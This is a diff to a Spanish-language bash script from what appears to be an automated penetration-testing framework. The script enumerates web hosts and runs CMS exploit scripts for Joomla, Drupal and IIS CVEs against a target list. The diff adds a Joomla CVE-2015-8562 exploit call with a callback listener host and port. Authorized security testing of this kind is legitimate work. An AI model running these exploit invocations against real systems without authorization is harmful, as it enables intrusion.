@@ -137,7 +137,6 @@ Cloudflare
 controlpanel
 cpanel
 erpnext
-Error1
 Fortinet
 Dahua
 GitLab
@@ -1225,6 +1224,8 @@ function enumeracionCMS () {
 			joomlaCVE-2023-23752.py "$proto_http"://"$host":"$port""$path_web" > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2023~23752.txt
 			joomblah-CVE-2017-8917.py "$proto_http"://"$host":"$port""$path_web" > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2017~8917.txt
 			joomlaPlugin-CVE-2018-17254.php -u "$proto_http"://"$host":"$port""$path_web"plugins/ > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2018~17254.txt
+			joomla-cve-2015-8562.py -t "$proto_http"://"$host":"$port""$path_web" -l 8.8.8.8 -p 443 # request to https://app.beeceptor.com/
+			joomlaCVE-2023-23752.rb "$proto_http"://"$host":"$port""$path_web" --no-color > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE-2023-23752.txt
 			
 
 			#joomla-cd.rb "$proto_http://$host" > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-joomla-CVE~2023~23752.txt &
@@ -1353,7 +1354,7 @@ for line in $(cat $TARGETS); do
 			echo -e "[+]Escaneando $host $port ($proto_http)"
 			if [[ ! -e ".enumeracion2/"$host"_"$port-$path_web_sin_slash"_webData.txt" ]]; then
 				echo -e "\t[i] Identificacion de técnologia usada en los servidores web"
-				webData -proto $proto_http -target $host -port $port -path $path_web -logFile logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webData.txt -maxRedirect 4 > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt 2>/dev/null &
+				webData -proto $proto_http -target $host -port $port -path $path_web -logFile logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webData.txt -maxRedirect 2 > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt 2>/dev/null &
 				if [[ "$proto_http" == "https" && "$HOSTING" == "n" ]] ;then
 					echo -e "\t[+]Obteniendo dominios del certificado SSL"
 					$proxychains get_ssl_cert $host $port | grep -v 'failed' > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_cert.txt  2>/dev/null &
@@ -1508,7 +1509,7 @@ for line in $(cat $TARGETS); do
 							#Verificar que no se obtuvo ese dato ya
 							if [ ! -e ".enumeracion2/"$host"_"$port-$path_web_sin_slash"_webData.txt"  ]; then
 								echo -e "\t[+] Obteniendo informacion web (host: $host port:$port)"
-								webData -proto $proto_http -target $host -port $port -path $path_web -logFile logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webData.txt -maxRedirect 4 > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt  2>/dev/null &
+								webData -proto $proto_http -target $host -port $port -path $path_web -logFile logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webData.txt -maxRedirect 2 > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt  2>/dev/null &
 							fi
 						fi
 					fi
@@ -2121,9 +2122,11 @@ if [[ $webScaneado -eq 1 ]]; then
 			[ ! -e ".vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2023~23752.txt" ] && egrep 'DB|Site' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2023~23752.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2023~23752.txt 2>/dev/null
 			[ ! -e ".vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2017~8917.txt" ] && egrep -i 'found' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2017~8917.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2017~8917.txt 2>/dev/null
 			[ ! -e ".vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2018~17254.txt" ] && egrep -i '+' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2018~17254.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2018~17254.txt 2>/dev/null
+			[ ! -e ".vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_joomla-CVE-2023-23752.txt" ] && egrep -i '+' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE-2023-23752.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE-2023-23752.txt 2>/dev/null
 			
+
 			[ ! -e ".vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_drupal-CVE~2018~7600.txt" ] && grep -i root logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_drupal-CVE~2018~7600.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_drupal-CVE~2018~7600.txt 2>/dev/null
-			[ ! -e ".enumeracion2/"$host"_"$port-$path_web_sin_slash"_company.txt" ] && cat logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_cert.txt 2>/dev/null | jq '.commonName' 2>/dev/null | extractCompany.py | egrep -v 'Error en la entrada|linksys|wifi' > .enumeracion/"$host"_"$port-$path_web_sin_slash"_company.txt 2>/dev/null
+			[ ! -e ".enumeracion2/"$host"_"$port-$path_web_sin_slash"_company.txt" ] && cat logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_cert.txt 2>/dev/null | jq '.commonName' 2>/dev/null | domain2company.py | egrep -v 'Error en la entrada|linksys|wifi|akamai|asus|dynamic-m|whatsapp|test|ruckuswireless|realtek|fbcdn|googlevideo|nflxvideo|winandoffice' > .enumeracion/"$host"_"$port-$path_web_sin_slash"_company.txt 2>/dev/null
 			
 			[ ! -e "logs/vulnerabilidades/${host}_${port}-${path_web_sin_slash}_wpUsers.txt" ] && cat logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wpUsers.json 2>/dev/null | wpscan-parser.py 2>/dev/null | awk {'print $2'} > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wpUsers.txt 2>/dev/null
 			[ ! -e "logs/vulnerabilidades/${host}_${port}-${path_web_sin_slash}_CS-39.txt" ] && cp logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-39.txt 2>/dev/null
@@ -2178,15 +2181,15 @@ if [[ $webScaneado -eq 1 ]]; then
 				fi
 			fi
 
-			if [ ! -e ".vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_redirectContent.txt" ]; then
-				#Redirect con contenido
-				egrep -qi "posiblemente vulnerable" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_httpmethods.txt 2>/dev/null
-				greprc=$?
-				if [[ $greprc -eq 0  ]];then
-					if [ "$VERBOSE" == '1' ]; then  echo "Redireccion con contenido DETECTADO $proto_http://$host:$port "; fi
-					curl --max-time 10 -k $proto_http://$host:$port > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_redirectContent.txt &
-				fi
-			fi
+			# if [ ! -e ".vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_redirectContent.txt" ]; then
+			# 	#Redirect con contenido
+			# 	egrep -qi "posiblemente vulnerable" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_httpmethods.txt 2>/dev/null
+			# 	greprc=$?
+			# 	if [[ $greprc -eq 0  ]];then
+			# 		if [ "$VERBOSE" == '1' ]; then  echo "Redireccion con contenido DETECTADO $proto_http://$host:$port "; fi
+			# 		curl --max-time 10 -k $proto_http://$host:$port > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_redirectContent.txt &
+			# 	fi
+			# fi
 
 			if [ ! -e "logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_IIS-CVE~2017~7269.txt" ]; then
 				#WebDAV
@@ -2465,6 +2468,11 @@ if [[ $webScaneado -eq 1 ]]; then
 			contenido="$url_vulnerabilidad"
 		fi
 
+		if [ $vulnerabilidad == 'redirectContent' ];then
+			if [ "$VERBOSE" == '1' ]; then  echo -e "[+] redirectContent"  ; fi
+			contenido="$url_vulnerabilidad"
+		fi
+
 
 		if [[ ${url_vulnerabilidad} == *"error"* || ${url_vulnerabilidad} == *"log"* || ${url_vulnerabilidad} == *"dwsync"*  ]];then
 			echo -e  "$OKRED[!] Archivo de error o log detectado! ($url_vulnerabilidad) $RESET"
@@ -2549,7 +2557,7 @@ if [[ -f servicios/admin-web-url.txt ]] ; then #
 
 			echo -e "\t[+] Identificando "
 			#web_fingerprint=`webData.pl -t $host -d "/$path_web2" -p $port -s $proto_http -e todo -l /dev/null -r 4 2>/dev/null | sed 's/\n//g'`
-			webData -proto $proto_http -target $host -port $port -path "/$path_web2" -logFile /dev/null -maxRedirect 4 2>/dev/null | sed 's/\n//g' > logs/enumeracion/"$host"_"$port-$path_web2_sin_slash"_webFingerprint.txt &		
+			webData -proto $proto_http -target $host -port $port -path "/$path_web2" -logFile /dev/null -maxRedirect 2 2>/dev/null | sed 's/\n//g' > logs/enumeracion/"$host"_"$port-$path_web2_sin_slash"_webFingerprint.txt &		
 		fi
 
 	done < servicios/admin-web-url.txt
